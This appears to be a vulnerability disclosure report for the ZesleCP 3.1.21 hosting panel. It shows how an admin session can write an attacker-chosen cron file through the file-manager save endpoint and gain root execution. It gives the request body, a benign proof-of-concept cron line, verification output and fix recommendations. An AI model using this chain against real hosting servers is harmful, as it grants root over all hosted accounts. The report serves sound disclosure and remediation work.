# ZesleCP 3.1.21 — Authenticated Arbitrary File Write → Cron → Root RCE

## 1. Overview

ZesleCP 3.1.21 is a self-hosted hosting control panel. Its architecture: `zeslesrv` (custom nginx/1.2.0 + Lua, ports 2083/2087 SSL) reverse-proxies `/file-manager`, `/agent-api`, `/webhooks`, and `/terminal-ws` to `zesle-agent` (Go gofiber v2.40.1, 127.0.0.1:2086, running as **root**) with **no nginx-level auth_request** — the agent enforces its own auth middleware that accepts the `zeslecp_session` cookie (no cookie → 401). Agent routes are not blocked by the license gate (which only guards the `/core/*` PHP API).

The agent's `POST /file-manager/save-file` handler writes attacker-controlled `data` to an attacker-chosen absolute `file_path` as root. Path validation is **inconsistent**: regular users (role=3) are jailed to `/home/<user>`, but admin sessions (role=1) have **no path restriction** — a validation gap (CWE-73), confirmed by the product's own jail logic. An admin writes a cron file to `/etc/cron.d/zesle-rce` with `* * * * * root sh -c '<cmd>'`; crond executes it as root within 60 seconds. Verified end-to-end with a unique marker showing `uid=0(root)` and the container hostname.

## 2. Vulnerability Summary

- **Type**: Authenticated arbitrary file write → cron → root RCE (CWE-73/CWE-434)
- **Root cause 1 (CWE-73)**: `POST /file-manager/save-file` writes attacker-controlled content to an attacker-chosen absolute path with no allowlist for admin sessions (regular users have a `/home/<user>` jail)
- **Root cause 2 (CWE-269)**: `zesle-agent` runs as root, so the written file and any cron execution inherit uid 0
- **Root cause 3 (CWE-284)**: the admin account has `shell=/bin/false` (no direct OS shell), making the file manager the admin's only OS-execution primitive — its path gap therefore escalates to full root
- **Result**: authenticated admin → root RCE via cron. CVSS 8.8.

## 3. Authentication Boundary

Authentication: `POST /login` with `{"username":"root","password":"<admin>","remember":false}` returns 200 and sets the `zeslecp_session` cookie (Laravel AES-encrypted, role embedded). The agent auth middleware validates the cookie (Laravel AES decrypt → role check): no cookie → 401; admin cookie (role=1) → routes reachable; regular user cookie (role=3) → file manager jailed to `/home/<user>`. The vulnerability is Target B (authenticated RCE) — the admin session itself is a normal login, not a bypass.

## 4. Attack Surface

- **Entry**: `POST /file-manager/save-file` (via `zeslesrv` reverse proxy to the agent) with `Cookie: zeslecp_session=<admin>`
- **Controllable parameters**: `file_path` (absolute path) and `data` (file content) — both fully attacker-controlled
- **No allowlist**: admin path validation is absent (regular users are jailed; admins are not)
- **Privilege**: root — `zesle-agent` runs as root and writes the file as root
- **Default configuration**: file manager is a core feature; agent routes are not license-gated; default-reachable

## 5. Sink Identification

The sink is the Go agent's `save-file` handler:

```go
// zesle-agent POST /file-manager/save-file
// body: {"file_path":"<absolute path>","data":"<content>"}
// behavior: writes data to file_path as root
// response: {"success":true}
```

Call-site extraction from the 3.3 MB Vue SPA (`app.js`):

```javascript
// app.js file-manager Vue component
saveFile({file_path: t, data: this.editor.getValue()})  // t = this.selected
getFile({file_path: t})
```

Path validation inconsistency (dynamically confirmed):
- admin (role=1) writes `/etc/cron.d/zesle-rce` → `{"success":true}` (no path restriction)
- regular user (role=3) writes `/etc/cron.d/x` → `{"success":false}` (jailed to `/home/<user>`)
- regular user reads `/etc/shadow` → `/home/testuser/etc/shadow: no such file` (path rewritten into `/home`)

The product knows to restrict paths (regular-user jail); the admin exemption is a validation gap (CWE-73), not intended behavior.

## 6. Source Identification & Controllability

The source is the admin `zeslecp_session` cookie (obtained via `POST /login`). Both `file_path` and `data` are fully attacker-controlled JSON fields; the handler performs no allowlist, no path traversal normalization, and no content validation for admin sessions.

## 7. Data Flow

```
POST /login (admin)
  → Laravel auth (bcrypt)
    → Set-Cookie zeslecp_session (AES-encrypted, role=1)

POST /file-manager/save-file  Cookie: zeslecp_session=...
  Body: {"file_path":"/etc/cron.d/zesle-rce","data":"* * * * * root <cmd>\n"}
  → zeslesrv nginx proxy_pass agent 2086 (no auth_request)
    → agent auth middleware (cookie valid, admin role=1 passes)
      → save-file handler
        → path validation: admin unrestricted
          → root writes /etc/cron.d/zesle-rce
            → crond executes the cron content as root within 60s
              → uid=0 (root)
```

## 8. Exploit Construction

Cron file payload:

```
file_path: /etc/cron.d/zesle-rce
data: * * * * * root sh -c 'id > /tmp/zs_rce_proof.txt 2>&1; echo <MARKER> >> /tmp/zs_rce_proof.txt; hostname >> /tmp/zs_rce_proof.txt'
```

Files under `/etc/cron.d/` are executed by crond with the user specified in the file (`root`), checked every minute. The admin account has `shell=/bin/false`, so the file manager is the admin's only OS-execution primitive — the write itself is the escalation.

## 9. Dynamic Verification

Real HTTP requests:
1. Login → 200 + `zeslecp_session` cookie (response includes `"role":"admin","shell_binary":"/bin/false"`).
2. `POST /file-manager/save-file` with the cron payload → `200 {"success":true}`.
3. After ~65 s, `POST /file-manager/file-content` reading `/tmp/zs_rce_proof.txt` →

```
uid=0(root) gid=0(root) groups=0(root)
ZESLE_VULN001_FRESH_<unique-marker>
12efe798b05a
```

- `uid=0(root)` → executed with root privileges ✓
- unique marker matches the PoC write (not historical residue) ✓
- hostname `12efe798b05a` → executed inside the target container ✓

An adversarial subagent independently re-ran the chain with a fresh unique marker and judged it a **REAL VULN** (not admin-by-design): all five falsification tasks passed (RCE re-run / path restriction / other root paths / cron attribution / admin-by-design assessment).

The "not admin-by-design" assessment is the key conclusion: the product deliberately confines regular users with a `/home/<user>` jail, proving the intended file-manager boundary is a restricted path set. The admin exemption is therefore an oversight in the same validation code path, not a documented capability. Moreover, the license gate blocks the intended admin cron-management API (`/core/cron`), so writing `/etc/cron.d` through `save-file` is a gate bypass that reaches the same root execution the product tried to restrict. Both signals — the regular-user jail and the license gate — confirm the unrestricted admin write is a vulnerability rather than a feature.

## 10. Reachability & Impact

- **Reachability**: requires an admin credential (set at install time, no default); the file manager is a core default feature and the agent routes are not license-gated; direct HTTP, no MITM.
- **Impact**: root file write and code execution on the hosting control panel host — all hosted accounts, databases, credentials, and site files under attacker control. For a hosting provider this is the crown-jewel server.
- **Scope**: ZesleCP 3.1.21 (and other versions with the same unrestricted admin `save-file` handler).

## 11. Fix Recommendations

1. Restrict `save-file` to a path allowlist (webroot/home/temp) for admins too
2. Forbid writes to `/etc`, `/root`, `/var/spool/cron`, `/etc/cron.d`, and other system-sensitive paths
3. Apply the same path jail to admins as to regular users (consistent validation)
4. Run the agent as a dedicated low-privilege user, not root

## 12. CWE & CVSS

- **CWE-73**: External Control of File Name or Path — unrestricted admin file write
- **CWE-269**: Improper Privilege Management — agent runs as root; admin has no path jail
- **CWE-284**: Improper Access Control — inconsistent admin vs regular-user path validation
- **CVSS**: 8.8 High — CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
